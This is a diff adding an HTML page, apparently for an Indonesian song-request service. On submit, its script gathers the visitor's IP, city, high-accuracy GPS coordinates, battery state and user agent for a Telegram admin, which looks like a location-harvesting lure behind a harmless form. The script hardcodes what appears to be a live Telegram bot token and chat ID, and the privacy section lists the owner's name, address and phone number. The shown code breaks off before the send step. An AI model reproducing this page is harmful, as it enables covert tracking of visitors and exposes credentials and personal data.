@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layanan Request Lagu - Kirim Permintaanmu Sekarang!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
+    <meta name="description" content="Kirim permintaan lagu favoritmu dengan mudah dan cepat ke admin. Layanan request lagu modern dan canggih!">
+    <meta name="keywords" content="request lagu, minta lagu, layanan musik, telegram bot, musik online, lagu favorit">
+    <meta name="author" content="Edo">
+
+    <meta property="og:title" content="Layanan Request Lagu - Kirim Permintaanmu Sekarang!">
+    <meta property="og:description" content="Kirim permintaan lagu favoritmu dengan mudah dan cepat ke admin. Layanan request lagu modern dan canggih!">
+    <meta property="og:image" content="https://placehold.co/1200x630/6a0dad/ffffff?text=Request+Lagu+Canggih"> <meta property="og:url" content="URL_WEBSITE_ANDA_DI_SINI"> <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Layanan Request Lagu">
+    <meta property="og:locale" content="id_ID">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Layanan Request Lagu - Kirim Permintaanmu Sekarang!">
+    <meta name="twitter:description" content="Kirim permintaan lagu favoritmu dengan mudah dan cepat ke admin. Layanan request lagu modern dan canggih!">
+    <meta name="twitter:image" content="https://placehold.co/1200x675/6a0dad/ffffff?text=Request+Lagu+Canggih"> <meta name="twitter:creator" content="@nama_pengguna_twitter_anda"> <style>
+        /* Definisi variabel CSS untuk skema warna yang konsisten */
+        :root {
+            --primary-color: #6a0dad; /* Deep Purple */
+            --secondary-color: #9d00ff; /* Brighter Purple */
+            --accent-color: #00f7ff;   /* Electric Blue */
+            --text-color: #e0e0e0; /* Light Gray for text */
+            --bg-color: #1a1a2e; /* Dark Blue-Purple for background */
+            --card-bg: #2a2a4a; /* Slightly lighter dark purple for cards */
+            --input-bg: #3a3a5a; /* Even lighter dark purple for inputs */
+            --button-hover: #5a009d; /* Darker purple on button hover */
+            --danger-color: #ff4d4d; /* Red for errors/cancel */
+            --status-open-color: #4CAF50; /* Green for open status */
+            --status-closed-color: #F44336; /* Red for closed status */
+            --shadow-color: rgba(0, 0, 0, 0.5);
+            --footer-bg: #10101a; /* Even darker background for footer */
+            --footer-text: #b0b0b0; /* Lighter gray for footer text */
+        }
+
+        /* Gaya dasar untuk body */
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column; /* Mengatur body sebagai flex column */
+            justify-content: space-between; /* Untuk mendorong footer ke bawah */
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--bg-color) 0%, #0f0f1c 100%);
+            color: var(--text-color);
+            overflow-x: hidden; /* Hide horizontal overflow */
+            position: relative;
+        }
+
+        /* Canvas for particle animation */
+        #particleCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0; /* Ensure behind main content */
+        }
+
+        /* Gaya untuk kontainer utama (kartu) */
+        .container {
+            background-color: var(--card-bg);
+            padding: 50px; /* Increased padding for more space */
+            border-radius: 25px; /* Slightly more rounded corners */
+            box-shadow: 0 15px 40px var(--shadow-color); /* More pronounced shadow */
+            text-align: center;
+            max-width: 550px; /* Slightly wider */
+            width: 90%;
+            position: relative;
+            z-index: 1; /* Ensure on top of background animation */
+            transform: scale(0.95);
+            animation: pop-in 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            border: 1px solid rgba(157, 0, 255, 0.3); /* Subtle border matching secondary color */
+            display: flex; /* Use flexbox for better internal layout */
+            flex-direction: column;
+            align-items: center;
+            gap: 25px; /* Spacing between elements */
+            margin-top: auto; /* Push container to center if footer is at bottom */
+            margin-bottom: auto;
+        }
+
+        /* Keyframes for pop-in animation */
+        @keyframes pop-in {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Gaya untuk judul h1 */
+        h1 {
+            color: var(--accent-color);
+            margin: 0; /* Remove default margin */
+            font-size: 2.8em; /* Larger font size */
+            font-weight: 800; /* Bolder font weight */
+            text-shadow: 0 0 15px rgba(0, 247, 255, 0.8), 0 0 25px rgba(0, 247, 255, 0.5); /* More intense glow */
+            letter-spacing: 1px; /* Slightly increased letter spacing */
+            line-height: 1.2;
+        }
+
+        /* Gaya untuk sambutan waktu */
+        .greeting {
+            font-size: 1.5em; /* Ukuran font lebih besar */
+            color: var(--secondary-color); /* Warna yang menonjol */
+            font-weight: 600;
+            margin-top: -15px; /* Sedikit naik agar dekat dengan judul h1 */
+            margin-bottom: 15px; /* Spasi di bawah sambutan */
+            text-shadow: 0 0 5px rgba(157, 0, 255, 0.5);
+        }
+
+        /* Gaya untuk paragraf */
+        p {
+            font-size: 1.15em; /* Slightly larger font */
+            line-height: 1.7;
+            margin: 0; /* Remove default margin */
+            max-width: 450px; /* Limit width for better readability */
+            color: var(--text-color);
+        }
+
+        /* Gaya untuk tampilan waktu dan tanggal */
+        .time-date {
+            font-size: 1.4em; /* Larger font */
+            color: var(--secondary-color);
+            font-weight: 700; /* Bolder */
+            letter-spacing: 0.5px;
+            background: rgba(0, 0, 0, 0.2); /* Subtle background for readability */
+            padding: 8px 15px;
+            border-radius: 8px;
+            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Gaya untuk tombol umum */
+        .btn {
+            background: linear-gradient(45deg, var(--primary-color) 0%, var(--secondary-color) 100%); /* Gradient background */
+            color: white;
+            padding: 18px 40px; /* Larger padding */
+            border: none;
+            border-radius: 12px; /* More rounded */
+            font-size: 1.3em; /* Larger font */
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease; /* Smooth transition for all properties */
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4); /* Deeper shadow */
+            letter-spacing: 0.5px;
+        }
+
+        /* Efek hover untuk tombol */
+        .btn:hover {
+            background: linear-gradient(45deg, var(--secondary-color) 0%, var(--primary-color) 100%); /* Reverse gradient on hover */
+            transform: translateY(-5px) scale(1.02); /* More pronounced lift and slight scale */
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.5); /* Even deeper shadow */
+        }
+
+        /* Efek aktif untuk tombol */
+        .btn:active {
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Gaya untuk tombol yang dinonaktifkan */
+        .btn:disabled {
+            opacity: 0.6; /* Reduced opacity */
+            cursor: not-allowed;
+            background: var(--card-bg); /* Flat background when disabled */
+            transform: translateY(0) scale(1); /* No hover/active effects */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* --- Gaya Halaman 2 (Formulir Permintaan) --- */
+        .request-container {
+            display: none; /* Hidden by default */
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            z-index: 1;
+            animation: pop-in 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        /* Gaya untuk judul h2 di halaman permintaan */
+        .request-container h2 {
+            color: var(--accent-color);
+            margin-bottom: 30px;
+            font-size: 2em;
+            text-shadow: 0 0 8px rgba(0, 247, 255, 0.7);
+        }
+
+        /* Gaya untuk grup formulir (label + input) */
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        /* Gaya untuk label input */
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        /* Gaya untuk input teks */
+        .form-group input[type="text"] {
+            width: calc(100% - 20px); /* Full width minus padding */
+            padding: 12px 10px;
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 1em;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            box-sizing: border-box; /* Ensure padding does not add to width */
+        }
+
+        /* Efek fokus untuk input */
+        .form-group input[type="text"]:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 10px rgba(0, 247, 255, 0.5);
+            outline: none; /* Remove default outline */
+        }
+
+        /* Gaya untuk tombol kirim */
+        .send-btn {
+            background: linear-gradient(45deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%; /* Full width */
+            box-shadow: 0 5px 15px var(--shadow-color);
+        }
+
+        /* Efek hover untuk tombol kirim */
+        .send-btn:hover {
+            background: linear-gradient(45deg, var(--secondary-color) 0%, var(--primary-color) 100%);
+            transform: translateY(-3px) scale(1.01);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        /* Efek aktif untuk tombol kirim */
+        .send-btn:active {
+            transform: translateY(0) scale(0.99);
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Gaya untuk pesan sukses/error */
+        .message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none; /* Hidden by default */
+            font-weight: 600;
+            animation: fade-in 0.5s forwards;
+        }
+
+        @keyframes fade-in {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message.success {
+            background-color: rgba(0, 255, 0, 0.2);
+            color: #0f0;
+        }
+
+        .message.error {
+            background-color: rgba(255, 0, 0, 0.2);
+            color: #f00;
+        }
+
+        /* Gaya untuk indikator loading */
+        .loading-indicator {
+            display: none;
+            margin-top: 20px;
+            color: var(--accent-color);
+            font-size: 1em;
+            font-weight: 600;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* --- Gaya Indikator Status Layanan --- */
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 25px; /* Adjusted padding: slightly less vertical, more horizontal */
+            border-radius: 15px; /* More rounded */
+            font-weight: 700;
+            font-size: 1.15em; /* Slightly larger font */
+            gap: 10px; /* Adjusted gap: slightly less */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4); /* Deeper shadow */
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            cursor: default; /* No pointer cursor */
+            line-height: 1.3; /* Ensure good line spacing if text wraps */
+        }
+
+        .status-indicator::before {
+            content: '';
+            display: inline-block;
+            width: 14px; /* Larger dot */
+            height: 14px; /* Larger dot */
+            border-radius: 50%;
+            background-color: currentColor; /* Use text color for dot */
+            animation: status-pulse 2s infinite ease-out; /* Subtle pulse animation */
+        }
+
+        @keyframes status-pulse {
+            0% { transform: scale(0.8); opacity: 0.7; }
+            50% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.7; }
+        }
+
+        .status-open {
+            background-color: rgba(76, 175, 80, 0.25); /* Slightly less transparent */
+            color: var(--status-open-color);
+        }
+
+        .status-closed {
+            background-color: rgba(244, 67, 54, 0.25); /* Slightly less transparent */
+            color: var(--status-closed-color);
+        }
+
+        /* --- Gaya Footer --- */
+        footer {
+            width: 100%;
+            padding: 20px 0;
+            background-color: var(--footer-bg); /* Darker background */
+            color: var(--footer-text); /* Lighter text color */
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: auto; /* Push footer to the bottom */
+            position: relative; /* Ensure it respects z-index of canvas */
+            z-index: 1; /* Keep it above the particle canvas */
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.3); /* Subtle shadow at the top */
+        }
+
+        footer p {
+            margin: 0;
+            padding: 0;
+            line-height: 1.5;
+        }
+
+        footer a {
+            color: var(--accent-color); /* Link color matching accent */
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        footer a:hover {
+            color: var(--secondary-color); /* Change color on hover */
+            text-decoration: underline;
+        }
+
+        /* --- Gaya Modal (Umum untuk Kebijakan Privasi) --- */
+        .modal-overlay {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background */
+            backdrop-filter: blur(5px); /* Blur effect on background */
+            z-index: 1000; /* On top of all content */
+            justify-content: center;
+            align-items: flex-start; /* Ensure content starts from top */
+            padding: 20px; /* Add padding to overlay */
+            box-sizing: border-box; /* Include padding in element's total width and height */
+        }
+
+        .modal-content {
+            background-color: var(--card-bg);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+            max-width: 600px; /* Wider for policy text */
+            width: 90%;
+            text-align: left;
+            transform: scale(0.9);
+            animation: modal-pop-in 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            position: relative; /* For close button positioning */
+            max-height: 90vh; /* Limit height to 90% of viewport height */
+            overflow-y: auto; /* Make content scrollable */
+        }
+
+        @keyframes modal-pop-in {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-content h3 {
+            color: var(--accent-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+            text-align: center;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .modal-content h4 { /* Gaya untuk sub-judul dalam modal */
+            color: var(--secondary-color);
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+            font-weight: 700;
+        }
+
+        .modal-content p {
+            font-size: 0.95em;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .modal-content ul {
+            list-style-type: disc;
+            margin-left: 20px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .modal-content ul li {
+            margin-bottom: 8px;
+        }
+
+        .modal-close-btn {
+            position: sticky; /* Changed to sticky */
+            top: 0; /* Stick to the top of the modal-content */
+            right: 0; /* Align to the right of the modal-content */
+            float: right; /* Helps with positioning when sticky */
+            background: none;
+            border: none;
+            font-size: 1.8em;
+            color: var(--secondary-color);
+            cursor: pointer;
+            transition: color 0.2s ease, transform 0.2s ease;
+            z-index: 1001; /* Ensure it's above modal content */
+            padding: 5px 10px; /* Add some padding for clickable area */
+            margin-top: -15px; /* Adjust to pull it up slightly */
+            margin-right: -15px; /* Adjust to pull it right slightly */
+        }
+
+        .modal-close-btn:hover {
+            color: var(--accent-color);
+            transform: rotate(90deg);
+        }
+
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .container, .request-container {
+                padding: 30px; /* Adjusted padding for smaller screens */
+            }
+            h1 {
+                font-size: 2.2em; /* Smaller font on mobile */
+            }
+            .greeting {
+                font-size: 1.2em; /* Smaller greeting on mobile */
+                margin-top: -10px;
+                margin-bottom: 10px;
+            }
+            p {
+                font-size: 1em;
+            }
+            .time-date {
+                font-size: 1.2em;
+            }
+            .btn, .send-btn {
+                padding: 15px 30px;
+                font-size: 1.1em;
+            }
+            .request-container h2 {
+                font-size: 1.8em;
+            }
+            .status-indicator {
+                font-size: 1em; /* Reduced font size for mobile */
+                padding: 8px 18px; /* Adjusted padding for mobile */
+                gap: 8px; /* Adjusted gap for mobile */
+            }
+            .status-indicator::before {
+                width: 10px;
+                height: 10px;
+            }
+            footer {
+                padding: 15px 0;
+                font-size: 0.8em;
+            }
+            .modal-content {
+                padding: 20px;
+            }
+            .modal-content h3 {
+                font-size: 1.5em;
+            }
+            .modal-close-btn {
+                font-size: 1.5em;
+                top: 5px; /* Adjusted for mobile */
+                right: 10px; /* Adjusted for mobile */
+                margin-top: -10px;
+                margin-right: -10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particleCanvas"></canvas>
+
+    <div id="welcomePage" class="container">
+        <h1>Selamat Datang di Layanan Request Lagu!</h1>
+        <p class="greeting" id="dynamicGreeting"></p>
+        <p>Di sini kamu bisa dengan mudah mengajukan permintaan lagu favoritmu. Cukup masukkan nama dan judul lagu yang kamu inginkan, dan kami akan berusaha memutar permintaanmu!</p>
+        <div class="time-date" id="currentTimeDate"></div>
+        <div class="status-indicator" id="serviceStatus"></div>
+        <button class="btn" id="startButton" onclick="showRequestPage()">Mulai Request Lagu</button>
+    </div>
+
+    <div id="requestPage" class="request-container">
+        <h2>Kirim Permintaan Lagumu!</h2>
+        <div class="form-group">
+            <label for="userName">Nama Kamu:</label>
+            <input type="text" id="userName" placeholder="Masukkan nama kamu" required>
+        </div>
+        <div class="form-group">
+            <label for="songName">Judul Lagu & Artis:</label>
+            <input type="text" id="songName" placeholder="Contoh: Memories - Maroon 5" required>
+        </div>
+        <button class="send-btn" onclick="sendRequest()">Kirim Permintaan</button>
+        <div id="loadingIndicator" class="loading-indicator"></div>
+        <div id="message" class="message"></div>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Layanan Request Lagu. Semua Hak Dilindungi.</p>
+        <p><a href="#" onclick="showPrivacyPolicyModal()">Kebijakan Privasi</a> | Dibuat dengan ✨ oleh AI.</p>
+    </footer>
+
+    <div id="privacyPolicyModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close-btn" onclick="hidePrivacyPolicyModal()">&times;</button>
+            <h3>Kebijakan Privasi</h3>
+            <p>Layanan Request Lagu ini berkomitmen untuk melindungi privasi pengguna. Kebijakan ini menjelaskan bagaimana kami mengumpulkan, menggunakan, dan melindungi informasi Anda.</p>
+
+            <h4>Informasi yang Kami Kumpulkan</h4>
+            <p>Saat Anda menggunakan formulir permintaan lagu, kami mengumpulkan informasi berikut:</p>
+            <ul>
+                <li>Nama Anda (yang Anda masukkan di formulir)</li>
+                <li>Judul Lagu dan Artis (yang Anda masukkan di formulir)</li>
+                <li>Waktu dan Tanggal Permintaan (otomatis)</li>
+                <li>Alamat IP (otomatis)</li>
+                <li>Informasi Lokasi (berdasarkan IP dan/atau GPS jika diizinkan, otomatis)</li>
+                <li>Informasi Baterai Perangkat (level dan status pengisian, otomatis)</li>
+                <li>Informasi Perangkat (User Agent browser dan OS, otomatis)</li>
+            </ul>
+
+            <h4>Bagaimana Informasi Digunakan</h4>
+            <p>Informasi yang dikumpulkan digunakan secara eksklusif untuk tujuan berikut:</p>
+            <ul>
+                <li>Mengirim permintaan lagu Anda ke admin Telegram untuk ditinjau dan diputar.</li>
+                <li>Menyediakan konteks tambahan kepada admin mengenai permintaan (misalnya, dari mana permintaan berasal, waktu permintaan).</li>
+            </ul>
+
+            <h4>Penyimpanan Data</h4>
+            <p><strong>Penting:</strong> Website ini tidak menyimpan data pribadi Anda di server kami. Semua informasi yang Anda masukkan atau yang dikumpulkan secara otomatis akan langsung dikirimkan ke bot Telegram dan kemudian diteruskan ke admin. Kami tidak memiliki database atau sistem penyimpanan data jangka panjang di website ini.</p>
+            <p>Satu-satunya data yang disimpan di sisi klien (browser Anda) adalah nama pengguna Anda (menggunakan Local Storage) agar Anda tidak perlu mengetikannya lagi saat kunjungan berikutnya. Data ini dapat dihapus kapan saja dengan membersihkan data situs di browser Anda.</p>
+
+            <h4>Pengungkapan Informasi kepada Pihak Ketiga</h4>
+            <p>Informasi Anda tidak akan dijual, diperdagangkan, atau dialihkan kepada pihak ketiga mana pun, kecuali kepada admin Telegram yang bertanggung jawab atas layanan permintaan lagu ini, untuk tujuan pemenuhan permintaan Anda.</p>
+
+            <h4>Keamanan</h4>
+            <p>Kami mengambil langkah-langkah yang wajar untuk melindungi informasi yang dikirimkan melalui website ini. Namun, perlu diingat bahwa tidak ada metode transmisi data melalui internet atau penyimpanan elektronik yang 100% aman. Oleh karena itu, kami tidak dapat menjamin keamanan mutlak.</p>
+
+            <h4>Perubahan Kebijakan Privasi</h4>
+            <p>Kami dapat memperbarui kebijakan privasi ini dari waktu ke waktu. Setiap perubahan akan diposting di halaman ini. Anda disarankan untuk meninjau kebijakan privasi ini secara berkala untuk setiap perubahan.</p>
+
+            <h4>Persetujuan Anda</h4>
+            <p>Dengan menggunakan layanan kami, Anda dengan ini menyetujui kebijakan privasi kami dan menyetujui persyaratannya.</p>
+
+            <h4>Informasi Pemilik</h4>
+            <p>Jika Anda memiliki pertanyaan lebih lanjut atau ingin menghubungi pemilik layanan ini, Anda dapat menggunakan informasi berikut:</p>
+            <ul>
+                <li>Nama: Edo</li>
+                <li>Alamat: Dsn Gedangkeret</li>
+                <li>Nomor HP: 6285955201695</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        // Token API Telegram Bot dan ID Chat Admin
+        const TELEGRAM_BOT_TOKEN = "7221617975:AAGvO_4y3lHW0_p-2q5XqBVbwRIjyMZ99LU";
+        const TELEGRAM_CHAT_ID = "7412906249";
+
+        // Batas waktu layanan (dalam jam, format 24 jam)
+        const SERVICE_CLOSE_HOUR = 23; // 23:00 (11 PM)
+        const SERVICE_OPEN_HOUR = 5;  // 05:00 (5 AM)
+
+        // Referensi elemen DOM
+        const welcomePage = document.getElementById('welcomePage');
+        const requestPage = document.getElementById('requestPage');
+        const currentTimeDateDiv = document.getElementById('currentTimeDate');
+        const dynamicGreetingDiv = document.getElementById('dynamicGreeting'); // Dynamic Greeting
+        const serviceStatusDiv = document.getElementById('serviceStatus'); // Service Status Indicator
+        const startButton = document.getElementById('startButton'); // Start Request Button
+        const userNameInput = document.getElementById('userName');
+        const songNameInput = document.getElementById('songName');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const messageDiv = document.getElementById('message');
+        const sendButton = document.querySelector('.send-btn');
+        const privacyPolicyModal = document.getElementById('privacyPolicyModal'); // Privacy Policy Modal
+
+        // --- Fungsi Utilitas Waktu dan Tanggal ---
+        /**
+         * Fungsi untuk memperbarui waktu dan tanggal saat ini.
+         * Waktu akan ditampilkan dalam format 24 jam dan tanggal DD/MM/YYYY.
+         */
+        function updateTimeAndDate() {
+            const now = new Date();
+            // Opsi untuk format waktu dan tanggal dengan timezone Asia/Jakarta
+            const options = {
+                timeZone: 'Asia/Jakarta',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false // Format 24 jam
+            };
+            const timeString = now.toLocaleTimeString('en-GB', options); // Menggunakan 'en-GB' untuk format 24 jam
+            const dateString = now.toLocaleDateString('en-GB', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+
+            currentTimeDateDiv.innerText = `${timeString} WIB - ${dateString}`;
+            updateDynamicGreeting(); // Panggil fungsi sambutan dinamis
+        }
+
+        /**
+         * Fungsi untuk memperbarui sambutan dinamis berdasarkan waktu saat ini.
+         */
+        function updateDynamicGreeting() {
+            const now = new Date();
+            const currentHour = now.toLocaleTimeString('en-GB', {
+                timeZone: 'Asia/Jakarta',
+                hour: '2-digit',
+                hour12: false
+            });
+            const hour = parseInt(currentHour, 10);
+
+            let greeting = 'Selamat Datang!'; // Default greeting
+
+            if (hour >= 5 && hour < 11) {
+                greeting = 'Selamat Pagi!';
+            } else if (hour >= 11 && hour < 15) {
+                greeting = 'Selamat Siang!';
+            } else if (hour >= 15 && hour < 18) {
+                greeting = 'Selamat Sore!';
+            } else if (hour >= 18 && hour < 23) {
+                greeting = 'Selamat Petang!';
+            } else { // 23:00 - 04:59
+                greeting = 'Selamat Malam!';
+            }
+            dynamicGreetingDiv.innerText = greeting;
+        }
+
+
+        // Memperbarui waktu setiap detik
+        setInterval(updateTimeAndDate, 1000);
+        updateTimeAndDate(); // Panggilan awal untuk menampilkan waktu segera dan sambutan
+
+        /**
+         * Fungsi untuk memperbarui status layanan (Buka/Tutup) dan mengaktifkan/menonaktifkan tombol.
+         */
+        function updateServiceStatus() {
+            const now = new Date();
+            const currentHour = now.toLocaleTimeString('en-GB', {
+                timeZone: 'Asia/Jakarta',
+                hour: '2-digit',
+                hour12: false
+            });
+            const hour = parseInt(currentHour, 10);
+
+            let isServiceOpen = true;
+            let statusText = 'Layanan: Buka';
+            let statusClass = 'status-open';
+
+            // Cek apakah di luar jam operasional (23:00 - 05:00)
+            if (hour >= SERVICE_CLOSE_HOUR || hour < SERVICE_OPEN_HOUR) {
+                isServiceOpen = false;
+                // Mengubah teks status agar lebih ringkas dan rapi
+                statusText = 'Layanan Tutup (23:00 - 05:00 WIB)';
+                statusClass = 'status-closed';
+            }
+
+            serviceStatusDiv.innerText = statusText;
+            serviceStatusDiv.className = `status-indicator ${statusClass}`;
+
+            startButton.disabled = !isServiceOpen;
+            // Opacity dan cursor akan diatur oleh CSS :disabled pseudo-class
+        }
+
+        // Panggil updateServiceStatus saat halaman dimuat dan setiap menit
+        setInterval(updateServiceStatus, 60 * 1000); // Perbarui setiap menit
+        updateServiceStatus(); // Panggilan awal
+
+        // --- Fungsi Navigasi Halaman ---
+        /**
+         * Fungsi untuk menampilkan halaman permintaan lagu dan menyembunyikan halaman selamat datang.
+         * Juga memuat nama pengguna dari local storage jika ada.
+         */
+        function showRequestPage() {
+            // Hanya izinkan navigasi jika layanan sedang buka
+            if (startButton.disabled) {
+                // Opsional: tampilkan pesan bahwa layanan sedang tutup
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'Layanan permintaan lagu sedang tutup. Mohon coba lagi nanti.';
+                messageDiv.style.display = 'block';
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 3000);
+                return;
+            }
+
+            welcomePage.style.display = 'none';
+            requestPage.style.display = 'block';
+            // Muat nama pengguna dari local storage
+            const savedUserName = localStorage.getItem('userName');
+            if (savedUserName) {
+                userNameInput.value = savedUserName;
+            }
+        }
+
+        // --- Fungsi Pengambilan Informasi Perangkat/Lokasi ---
+        /**
+         * Mengambil alamat IP dan informasi lokasi menggunakan ipinfo.io.
+         * @returns {Promise<{ip: string, location: string}>} Objek berisi IP dan lokasi.
+         */
+        async function getIpAndLocation() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                const ip = data.ip || 'Tidak Tersedia';
+                const city = data.city || 'Tidak Tersedia';
+                const region = data.region || '';
+                const country = data.country || '';
+                let location = 'Tidak Tersedia';
+                if (city !== 'Tidak Tersedia') {
+                    location = city;
+                    if (region && region !== city) location += `, ${region}`; // Hindari "Jakarta, Jakarta"
+                    if (country) location += `, ${country}`;
+                }
+                return { ip, location };
+            } catch (error) {
+                console.error('Error getting IP and location:', error);
+                return { ip: 'Gagal Mendapatkan', location: 'Gagal Mendapatkan' };
+            }
+        }
+
+        /**
+         * Mengambil informasi baterai (level dan status pengisian).
+         * @returns {Promise<{level: string, charging: string}>} Objek berisi level baterai dan status pengisian.
+         */
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = (battery.level * 100).toFixed(0); // Persentase tanpa desimal
+                    const charging = battery.charging ? 'Ya' : 'Tidak';
+                    return { level, charging };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                    return { level: 'Tidak Tersedia', charging: 'Tidak Tersedia' };
+                }
+            } else {
+                return { level: 'Tidak Didukung', charging: 'Tidak Didukung' };
+            }
+        }
+
+        /**
+         * Mengambil lokasi geografis yang lebih presisi menggunakan Geolocation API.
+         * @returns {Promise<{latitude: string, longitude: string}>} Objek berisi lintang dan bujur.
+         */
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude.toFixed(4);
+                            const lon = position.coords.longitude.toFixed(4);
+                            resolve({ latitude: lat, longitude: lon });
+                        },
+                        (error) => {
+                            console.warn('Geolocation error:', error.message);
+                            resolve({ latitude: 'Tidak Diizinkan/Tersedia', longitude: 'Tidak Diizinkan/Tersedia' });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    resolve({ latitude: 'Tidak Didukung', longitude: 'Tidak Didukung' });
+                }
+            });
+        }
+
+        /**
+         * Mengambil User Agent browser.
+         * @returns {string} String User Agent.
+         */
+        function getUserAgent() {
+            return navigator.userAgent || 'Tidak Tersedia';
+        }
+
+        // --- Fungsi Utama Pengiriman Permintaan ---
+        /**
+         * Mengirim permintaan lagu ke Telegram.
+         * Melakukan validasi input, mengambil informasi tambahan, membangun pesan, dan mengirimkannya via API Telegram.
+         */
+        async function sendRequest() {
+            const userName = userNameInput.value.trim();
+            const songName = songNameInput.value.trim();
+
+            // Sembunyikan pesan sebelumnya
+            messageDiv.style.display = 'none';
+            messageDiv.className = 'message'; // Reset kelas
+
+            // Validasi input
+            if (!userName || !songName) {
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'Mohon isi nama kamu dan judul lagu.';
+                messageDiv.style.display = 'block';
+                return;
+            }
+
+            // Simpan nama pengguna ke local storage
+            localStorage.setItem('userName', userName);
+
+            // Tampilkan indikator loading dan nonaktifkan tombol
+            loadingIndicator.innerText = 'Mengambil informasi perangkat...';
+            loadingIndicator.style.display = 'block';
+            sendButton.disabled = true;
+            // Opacity dan cursor akan diatur oleh CSS :disabled pseudo-class
+
+            // Ambil waktu dan tanggal saat ini
+            const now = new Date();
+            const timeOptions = { timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+            const timeString = now.toLocaleTimeString('en-GB', timeOptions);
